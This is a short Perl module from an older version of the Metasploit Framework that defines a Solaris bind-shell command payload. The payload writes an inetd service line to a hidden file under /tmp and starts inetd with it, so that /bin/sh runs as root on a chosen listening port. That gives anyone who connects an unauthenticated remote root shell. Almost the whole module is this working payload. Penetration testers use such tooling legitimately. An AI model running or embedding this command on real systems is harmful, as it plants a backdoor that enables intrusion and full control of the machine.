package Msf::Payload::sol_cmd_bind;
use strict;
use base 'Msf::CommandPayload';

my $info =
{
    Name         => 'sol_cmd_bind',
    Version      => '1.0',
    Description  => 'Listen for connection and spawn a shell',
    Author       => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    Arch         => [  ],
    Priv         => 0,
    OS           => [ 'solaris' ],
    Keys         => ['sol_cmd'], 
    Multistage   => 0,
    Type         => 'bind_shell',
    Size         => '',
    UserOpts     =>
        {
            'LPORT' => [1, 'PORT', 'Listening port for bind shell'],
        },
        
    CommandPayload =>
    "echo [>LPORT<] stream tcp nowait root /bin/sh sh > /tmp/.msf_sol_bind;".
    "/usr/sbin/inetd -s /tmp/.msf_sol_bind",
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    return($self);
}
